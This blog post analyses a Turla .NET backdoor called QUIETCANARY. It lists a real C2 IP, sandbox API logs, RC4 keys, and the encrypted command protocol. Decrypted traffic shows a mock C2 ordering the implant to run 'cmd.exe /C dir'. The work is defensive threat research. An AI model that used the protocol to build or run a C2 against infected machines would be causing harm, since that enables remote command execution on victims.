---
title: "TURLA QuietCanary"
date: 2025-03-07
---
  
<link rel="stylesheet" href="/css/main.css">

SHA256 : 3f94b20cb7f4ff55207660649ebbb02679c991fe03efbcb0bd3840fc7f0bd527  
sample source : [bazar.abuse.ch](https://bazaar.abuse.ch/sample/3f94b20cb7f4ff55207660649ebbb02679c991fe03efbcb0bd3840fc7f0bd527/)  
VT : [VirusTotal](https://www.virustotal.com/gui/file/3f94b20cb7f4ff55207660649ebbb02679c991fe03efbcb0bd3840fc7f0bd527)  

Report: <https://cloud.google.com/blog/topics/threat-intelligence/turla-galaxy-opportunity?hl=en>  

C2 :  
https://210.48.231.182/  

Analyzed sample is a 32bit .NET PE attributed to TURLA by Mandiant and named QUIETCANARY / Tunnus.  

As usual, results from dynamic analysis are shared in my repository ([logs](https://github.com/cedricg-mirror/reflexions/blob/main/APT/TURLA/QuietCanary/3f94b20cb7f4ff55207660649ebbb02679c991fe03efbcb0bd3840fc7f0bd527/logs.txt))  


---  

**Commentary**  

As a reminder, the sandbox that I'm developping doesn't provide any proper interface to monitor managed code (yet).  
Supervision of managed code is done indirectly by monitoring activity from native DLL loaded by the monitored process.  
As a consequence, logs provided are 'noisy', the same kind of noise you would get by monitoring syscall instead of Win32 API for instance.  
 
---  

This sample is so minimalistic that dynamic analysis alone is basically only usefull to provide the C2 :  

```html
[...]

[CNT] [49]
[PTP] [0xba8] [0xbac] [c:\users\user\desktop\quiet_canary\canary.exe]
[INF] [ Called from Native Image DLL ]
[API] <WSAConnect> in [WS2_32.dll] 
[PAR] SOCKET   s     : 0x3d8
[PAR] sockaddr *name : 0x0000009B393446A8
[FLD]          -> sin_family   : 2 (IPv4)
[FLD]          -> sin_port     : 47873 (Little endian : 443)
[FLD]          -> sin_addr     : 210.48.231.182
[RET] 0x7ff817b03542 in [System.ni.dll]

[ * ] [pid 0xba8][tid 0xbac] c:\users\user\desktop\quiet_canary\canary.exe
[EVT] [Max Sleep]
[MSG] Delay Execution reduced from 300000 ms to 15000 ms 
```

Results of dynamic analysis without a working C2 is provided in the attached 'logs_no_c2.txt' file.  

---  

Going further, I decided to use some statical analysis and develop a bare minimum C2 to trigger some additional behavior from the sample :  

![Alt text](screenshots/init.jpg?raw=true "first beaconing")

Statical analysis is very straightforward as this sample isn't obfuscated in any way.

Now, the first beaconing to the C2 is a HTTP GET request with a hardcoded useragent.  
The initial RC4 Key, that the C2 will have to use in reply to that first beaconing, is also visible in that screenshot.   

The following routine tells us how the C2 is expected to reply (Base64(Rc4(reply)) :  

```cs
 using (StreamReader streamReader = new StreamReader(response.GetResponseStream()))
            empty = Encoding.UTF8.GetString(RC4Encryption.EncryptDecrypt(Convert.FromBase64String(streamReader.ReadToEnd()), this.initialKey));
```

After decryption of the reply, QUIETCANARY is expecting the following answer from the C2 :  

![Alt text](screenshots/new_rc4_key.jpg?raw=true "New Rc4 Key")

In other words, the keyword "use" followed by a 10 letters string that is going to be used as a new RC4 key to encrypt communications.  

---  

Now, If you take a look at the provided "logs.txt" file, you will find how this additional knowledge is translated in terms of dynamic behavior :  

Initial beaconing :  

```html
[CNT] [99]
[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
[INF] [ Called from Native Image DLL ]
[API] <SealMessage> in [SSPICLI.DLL] 
[PAR] LSA_SEC_HANDLE ContextHandle         : 0x0000002641957A48
[PAR] ULONG          QualityOfProtection   : 0x0
[PAR] PSecBufferDesc MessageBuffers        : 0x000000264195BD10
[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
[FLD]                -> cBuffers  = 0x4
[FLD]                -> pBuffers  = 0x000000264195BD38
[FLD]                   -> pBuffers[0]
[FLD]                   -> cbBuffer   = 0x5
[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
[FLD]                   -> pvBuffer   = 0x000000264195B9B8
[FLD]                   -> pBuffers[1]
[FLD]                   -> cbBuffer   = 0xed
[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
[FLD]                   -> pvBuffer   = 0x000000264195B9BD
[STR]                   -> "GET / HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71."
[STR]                      "0.3578.98 Safari/537.36\r\nCookie: PHPSESSID=ir01w34mah37x1sjingfx92gcm\r\nHost: 210.48.231.182\r\nConnection: Keep-Aliv"
[STR]                      "e\r\n\r\n"
[FLD]                   -> pBuffers[2]
[FLD]                   -> cbBuffer   = 0x24
[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
[FLD]                   -> pvBuffer   = 0x000000264195BAAA
[FLD]                   -> pBuffers[3]
[FLD]                   -> cbBuffer   = 0x0
[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
[FLD]                   -> pvBuffer   = 0x0000000000000000
[PAR] ULONG          MessageSequenceNumber : 0x0
[RET] 0x7ffa2bc07b87 in [System.ni.dll]
```

Reply from the C2 :  

```html
[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
[API] <DecryptMessage>
[PAR] PSecBufferDesc pMessage     : 0x0000000400000000
[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
[FLD]                -> cBuffers  = 0x4
[FLD]                -> pBuffers  = 0x000000264195C0D0
[FLD]                   -> pBuffers[0]
[FLD]                   -> cbBuffer   = 0x5
[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
[FLD]                   -> pvBuffer   = 0x000000264195BE90
[FLD]                   -> pBuffers[1]
[FLD]                   -> cbBuffer   = 0xe0
[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
[FLD]                   -> pvBuffer   = 0x000000264195BE95
[STR]                   -> "HTTP/1.1 200 OK\r\nDate: Fri, 07 Mar 2025 16:41:50 GMT\r\nServer: Apache/2.4.41 (Ubuntu)\r\nContent-Length: 20\r\nKeep-A"
[STR]                      "live: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: text/html; charset=UTF-8\r\n\r\nDmYJ6sFTT2NFyAtWjQ=="
[FLD]                   -> pBuffers[2]
[FLD]                   -> cbBuffer   = 0x20
[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
[FLD]                   -> pvBuffer   = 0x000000264195BF75
[FLD]                   -> pBuffers[3]
[FLD]                   -> cbBuffer   = 0x0
[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
[FLD]                   -> pvBuffer   = 0x0000000000000000
[RES] SECURITY_STATUS 0x0 (SEC_E_OK)
```

To understand the reply "DmYJ6sFTT2NFyAtWjQ==" we need to follow the decryption routine from above :  

```
RC4(Base64_Decode(DmYJ6sFTT2NFyAtWjQ==), "btpacbazyq")  
```

Witch gives the following clear text :  

 ```
"usegorgonzola"  
```

As you can see, I didn't use that opportunity to put forward french cheese :)  
So from this point forward, communication between the malware and the C2 will be encrypted with gorgonzola flavored RC4.  

The malware is aknowledging this new passphrase with the following reply :  

```html
[CNT] [115]
[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
[INF] [ Called from Native Image DLL ]
[API] <SealMessage> in [SSPICLI.DLL] 
[PAR] LSA_SEC_HANDLE ContextHandle         : 0x0000002641957A48
[PAR] ULONG          QualityOfProtection   : 0x0
[PAR] PSecBufferDesc MessageBuffers        : 0x000000264197AFA8
[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
[FLD]                -> cBuffers  = 0x4
[FLD]                -> pBuffers  = 0x000000264197AFD0
[FLD]                   -> pBuffers[0]
[FLD]                   -> cbBuffer   = 0x5
[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
[FLD]                   -> pvBuffer   = 0x000000264197AD18
[FLD]                   -> pBuffers[1]
[FLD]                   -> cbBuffer   = 0x154
[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
[FLD]                   -> pvBuffer   = 0x000000264197AD1D
[STR]                   -> "33LsTGt2qYwqZw6+39eYiJ6dWRpufKA0uXkCgAALT2V+PMrW/U9CuZathJ6jQ4OQmrWHebBrBwQmREBSBS4cb/DUDqf3TGzRnghCORaCx15bxxUCxBZgKgQ7"
[STR]                      "YQeyMnjvbjpAPKrEwhUUf/zl/WNCtEfqsZpBbZtszSqTSpZP7NYhFZsdcT/3C1z5en6h+wtyLYsuYuCUmCY8pRhTclHIOzgYVstR1id+I6cb3Dm+C7rG5kMA"
[STR]                      "P0fDdZGmCnYGHQIRtcmHCM8f1++Kb1l5ooBP+X1oawzEzQPZlfzB2GDmNqpLWqwWxx4WN56WFVyBlOlDAGB7jNkklGF1PSY4mw=="
[FLD]                   -> pBuffers[2]
[FLD]                   -> cbBuffer   = 0x24
[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
[FLD]                   -> pvBuffer   = 0x000000264197AE71
[FLD]                   -> pBuffers[3]
[FLD]                   -> cbBuffer   = 0x0
[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
[FLD]                   -> pvBuffer   = 0x0000000000000000
[PAR] ULONG          MessageSequenceNumber : 0x0
[RET] 0x7ffa2bc07b87 in [System.ni.dll]
```

Which needs to be decrypted with the new passphrase to get the clear text :  

```
RC4(Base64_Decode(33LsTGt2qYwqZw6+39eYiJ6dWRpufKA0uXkCgAALT2V+PMrW/U5bxxUCxBZgKgQ7...), "Gorgonzola")  
```

```
repok433c1682f6d7282c7d59e7da7665aeabf1b20348db8b9a5eb01303e703f59d1b...
```

So "rep" . "ok" . nonce  

The nonce is generated using the following routine :  

![Alt text](screenshots/nonce.jpg?raw=true "New Rc4 Key")

It's function is very likely to add some noise to the SSL encrypted traffic to make it more difficult to 'guess' what is happening based on the size of HTTPS requests.  

--- 

Now that we have established a trusted relationship with QUIETCANARY we can start sending some commands among the following :  

![Alt text](screenshots/orders.jpg?raw=true "Available commands")

Notice the 666 code associated with the "KillCommand", TURLA developpers were kind enough to refrain from using Order 66 which would have been a much violent crime...

---  

I've decided to test a simple 'dir' command :  

```html
[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
[API] <DecryptMessage>
[PAR] PSecBufferDesc pMessage     : 0x0000000400000000
[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
[FLD]                -> cBuffers  = 0x4
[FLD]                -> pBuffers  = 0x000000264197B208
[FLD]                   -> pBuffers[0]
[FLD]                   -> cbBuffer   = 0x5
[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
[FLD]                   -> pvBuffer   = 0x000000264195BE90
[FLD]                   -> pBuffers[1]
[FLD]                   -> cbBuffer   = 0xbc
[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
[FLD]                   -> pvBuffer   = 0x000000264195BE95
[STR]                   -> "HTTP/1.1 200 OK\r\nDate: Fri, 07 Mar 2025 16:41:50 GMT\r\nServer: Apache/2.4.41 (Ubuntu)\r\nContent-Length: 40\r\nConten"
[STR]                      "t-Type: text/html; charset=UTF-8\r\n\r\n3XLuSjRx6Y17ZlS329KMj8TLT011LuYhr18VgAhO"
[FLD]                   -> pBuffers[2]
[FLD]                   -> cbBuffer   = 0x24
[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
[FLD]                   -> pvBuffer   = 0x000000264195BF51
[FLD]                   -> pBuffers[3]
[FLD]                   -> cbBuffer   = 0x0
[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
[FLD]                   -> pvBuffer   = 0x0000000000000000
[RES] SECURITY_STATUS 0x0 (SEC_E_OK)
```

So :  

```
RC4(Base64_Decode(3XLuSjRx6Y17ZlS329KMj8TLT011LuYhr18VgAhO), "Gorgonzola")  
```

```
"peri43s220l16c"cmd.exe" /C dir"
```

The format of any order is the following :  

"rep" . "i" . id . "s" . command_code . "l" . cmd_parameter_length . "c" . cmd_parameter

Which triggered the following behavior from the malare :  

```html
[CNT] [121]
[PTP] [0x784] [0x918] [c:\users\user\desktop\quiet_canary\canary.exe]
[INF] [ Called from Native Image DLL ]
[API] <CreatePipe> in [KERNEL32.dll] 
[PAR] PHANDLE               hReadPipe        : 0x000000265B15E9F0
[PAR] PHANDLE               hWritePipe       : 0x000000265B15E9F8
[PAR] LPSECURITY_ATTRIBUTES lpPipeAttributes : 0x000000265B15E9C0
[PAR] DWORD                 nSize            : 0x0
[RET] 0x7ffa2c05bd5f in [System.ni.dll]

[ * ] [pid 0x784][tid 0x918] c:\users\user\desktop\quiet_canary\canary.exe
[API] <CreatePipe>
[PAR] HANDLE  hReadPipe  : 0x48c
[PAR] HANDLE  hWritePipe : 0x668
[RES] BOOL 0x1

[CNT] [125]
[PTP] [0x784] [0x918] [c:\users\user\desktop\quiet_canary\canary.exe]
[INF] [ Called from Native Image DLL ]
[API] <CreateProcessW> in [KERNEL32.dll] 
[PAR] LPCWSTR               lpApplicationName   : 0x0 (null)
[PAR] LPCWSTR               lpCommandLine       : 0x000000265B15E9F0
[STR]                       -> ""cmd.exe"  /C dir"
[PAR] LPSECURITY_ATTRIBUTES lpProcessAttributes : 0x0
[PAR] LPSECURITY_ATTRIBUTES lpThreadAttributes  : 0x0
[PAR] BOOL                  bInheritHandles     : 0x1
[PAR] DWORD                 dwCreationFlags     : 0x8000000 (CREATE_NO_WINDOW)
[PAR] LPVOID                lpEnvironment        : 0x0
[PAR] LPCWSTR               lpCurrentDirectory   : 0x000000264193FB84
[STR]                       -> "C:\Users\user\Desktop\quiet_canary"
[PAR] LPSTARTUPINFOW        lpStartupInfo        : 0x000000265B15E980
[FLD]                       -> lpDesktop   = 0x0 (null)
[FLD]                       -> lpTitle     = 0x0 (null)
[FLD]                       -> dwFlags     = 0x100 (STARTF_USESTDHANDLES)
[FLD]                       -> wShowWindow = 0x0
[FLD]                       -> hStdInput   = 0x0
[FLD]                       -> hStdOutput  = 0x668
[FLD]                       -> hStdError   = 0x670
[PAR] LPPROCESS_INFORMATION lpProcessInformation : 0x000000264193F388
[RET] 0x7ffa2bbfec01 in [System.ni.dll]
```

And the following reply :  

```html
[CNT] [180]
[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
[INF] [ Called from Native Image DLL ]
[API] <SealMessage> in [SSPICLI.DLL] 
[PAR] LSA_SEC_HANDLE ContextHandle         : 0x0000002641968E08
[PAR] ULONG          QualityOfProtection   : 0x0
[PAR] PSecBufferDesc MessageBuffers        : 0x000000264196BBB8
[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
[FLD]                -> cBuffers  = 0x4
[FLD]                -> pBuffers  = 0x000000264196BBE0
[FLD]                   -> pBuffers[0]
[FLD]                   -> cbBuffer   = 0x5
[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
[FLD]                   -> pvBuffer   = 0x000000264196B5E8
[FLD]                   -> pBuffers[1]
[FLD]                   -> cbBuffer   = 0x494
[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
[FLD]                   -> pvBuffer   = 0x000000264196B5ED
[STR]                   -> "33LsSjRx9ol5YkqmodSOmsbDFEVoa6Bg7m8ViAQcFTYoKcrC7Qkw+8q61orrRpKInOnGIrpkGTgfVD9SEnBaZAZEGPm1HmvDjP2KfhrU0Q9K3wEPnwI/fBdo"
[STR]                      "I0anYCW1G3JNR4nO+XkhR+mFXP9R6Aamv8tWOYk8mTnoFa98qYRiUfBRN22wZHqqbXOz9UkWb88kMPetwyFkoFgbSmmkAz0YGJ9VmnB4cqIMzW3tV7mf/1YW"
[STR]                      "e0OyXvqpTmdAWBoCoN2UGdh3vO/ZcF1/v4Id+H8pewjEk1fX1uSEnmWUT8BHH7oC1AYHIobTBkXKoNBAA3t42sFykmIlK2BrzyzHY38fcmEcYIY9Qs/Ue7Dc"
[STR]                      "xdo4YWDZHA3gHwvRx4cMK17ugYHzK1Lvi9oL1vjhi4fgpxPYNACDVZ8JJ5Ie7k7Yx5GGmDfskTeErEIMDxCni7V4WdqPSXMaRtvAGtC4XesRq2nlFmVYF57P"
[STR]                      "U7eYV38UBhtiWE+TWkXkrx2GgygP/jRbUt4HjF5gHKbfVV9oU/dG0wD98XCR0bPVRoCRiIHxVqHuGdENSx7xqguIhKmwLG2RZTKhPefliMHjdb8D2ZOgrnbU"
[STR]                      "V0eslre6cMhAARtqWyCP02GmJp63kuDSfYHgVzTQytHw72aBmsHb+vUBmpLIgZBswvfvDpVOz42t568E1eLbsEQxfAcr/ZIrwkXrvpMbTXiAh3lOdkSFOCjb"
[STR]                      "1LWbhvIUsXVKaQXJCFSJ962MobLA0WMoovMe8RWz9xjhL5I+N6xqD+pvGXOVUgUF3Dz6pFQA8oDQOV+maGaq6ekXmRJeDL6HBbJrcXupTDfQfl2BmujE9HCb"
[STR]                      "WuPZ/eU4m6chDHWjTy1haBN2sObaLFM+ei1c0VWcnyC6vXbHz7z9wh4g5pCAe7iBJVaDKOaNWuywz8a28zv/QC2iHKDscOajaOrNmKdfH82p4DwNbkjWTaE4"
[STR]                      "dfR6E79pWqDoEuLlyIkv6fJ6kBbIO8Nf40Zk/ZxU/zRbozZniuWXpVLNKDtgPM5aUlbyfSanEwp33D1nRWF2qbkWkLJikdvzBkJguquBQCuiv4n4r+s/LPVM"
[STR]                      "WK7PVRnSEjRcQCr67aEeyqccYIOyJoDRz5WiVYhqIvS/UhTeS/iShix3StCITNZ1lDeNXvaP8J/N30iv2qMT/hD6+vlz"
[FLD]                   -> pBuffers[2]
[FLD]                   -> cbBuffer   = 0x24
[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
[FLD]                   -> pvBuffer   = 0x000000264196BA81
[FLD]                   -> pBuffers[3]
[FLD]                   -> cbBuffer   = 0x0
[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
[FLD]                   -> pvBuffer   = 0x0000000000000000
[PAR] ULONG          MessageSequenceNumber : 0x0
[RET] 0x7ffa2bc07b87 in [System.ni.dll]
```

After decryption :   

```
repi43l604r Le volume dans le lecteur C n'a pas de nom.
 Le numéro de série du volume est 689B-5BB9

 Répertoire de C:\Users\user\Desktop\quiet_canary

07/03/2025  17:28    <DIR>          .
07/03/2025  17:28    <DIR>          ..
03/03/2025  15:16            18 432 canary.exe
26/02/2025  13:52           945 845 faut-il-revoir-lhistoire-du-cicr-durant-la-seconde-guerre-mondiale.pdf
21/02/2025  02:01         2 695 478 Geneva conventions August 1949.pdf
07/03/2025  15:38                14 t.bat
               4 fichier(s)        3 659 769 octets
               2 Rép(s)  47 355 650 048 octets libres
1096dd40993462422ce49eccae2ef72f4d6c826099535d0d76ec705dd65850bc1...
```

So "rep" . "i" . id (43) . "l" . result_length (604) . "r" . result . nonce

--- 

My (very) lazy C2 implementation looks like this : 

![Alt text](screenshots/c2.jpg?raw=true "Lazy C2")

---  

As a final note, there is a piece of dead code that may or may not be useful to look for previous or newer samples :  

![Alt text](screenshots/dead_code.jpg?raw=true "unused routine")
